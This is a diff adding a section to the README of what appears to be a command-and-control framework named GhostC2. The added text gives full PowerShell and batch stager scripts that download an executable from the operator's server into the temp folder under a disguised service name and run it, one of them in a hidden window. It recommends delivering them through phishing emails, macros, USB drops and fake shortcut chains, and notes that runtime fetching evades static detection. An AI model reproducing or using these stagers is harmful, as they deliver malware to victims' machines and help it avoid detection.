@@ -84,6 +84,64 @@ Output saved to `builds/`
 
 ---
 
+### 🎯 Stagers (Initial Access)
+
+GhostC2 includes multiple **delivery stagers** in the `/stagers` directory, designed to fetch and execute the full agent from a remote server.
+
+#### 🪖 PowerShell Stager (`payload_stager.ps1`)
+
+Downloads and executes the payload from your GhostC2 host:
+
+$payloadUrl = "http://your.server.ip/builds/ghost_payload.exe"
+$localPath = "$env:TEMP\ghostsvc.exe"
+Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath -UseBasicParsing
+Start-Process -FilePath $localPath -WindowStyle Hidden
+
+yaml
+Copy
+Edit
+
+Use in:
+- Phishing emails
+- Macros
+- USB drops
+- Post-exploit scripting
+
+---
+
+#### 🧱 Batch Stager (`payload_stager.bat`)
+
+Simple `.bat` version for Windows:
+
+@echo off
+set PAYLOAD_URL=http://your.server.ip/builds/ghost_payload.exe
+set PAYLOAD_PATH=%TEMP%\ghostsvc.exe
+
+powershell -Command "Invoke-WebRequest -Uri '%PAYLOAD_URL%' -OutFile '%PAYLOAD_PATH%' -UseBasicParsing"
+start "" "%PAYLOAD_PATH%"
+
+yaml
+Copy
+Edit
+
+Use in:
+- `.zip` phishing drops
+- Fake `.lnk` shortcut chains
+- Legacy script execution
+
+---
+
+### 🔐 Reminder
+
+These stagers **do not contain the payload directly**. They fetch the compiled GhostC2 `.exe` agent at runtime — minimizing static detection and enabling modular deployment.
+
+
+
+---
+
+
+
+
 ## 🔐 Security Notes
 
 - All beacon traffic is AES-256 encrypted
